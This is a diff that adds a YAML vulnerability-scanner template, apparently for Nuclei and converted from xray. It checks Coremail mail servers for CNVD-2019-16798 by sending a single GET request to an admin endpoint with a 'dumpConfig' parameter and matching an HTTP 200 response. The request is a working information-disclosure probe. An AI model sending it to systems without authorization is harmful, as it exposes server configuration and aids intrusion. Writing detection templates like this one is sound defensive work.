@@ -1,0 +1,21 @@
+id: poc-yaml-coremail-cnvd-2019-16798
+
+info:
+  name: poc-yaml-coremail-cnvd-2019-16798
+  author: cc_ci(https://github.com/cc8ci)
+  severity: high
+  tags: xray-converted,cnvd-2019-16798,ct-158053
+  reference:
+    - https://www.secpulse.com/archives/107611.html
+
+http:
+  - raw:
+      - |
+        GET /mailsms/s?func=ADMIN:appState&dumpConfig=/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
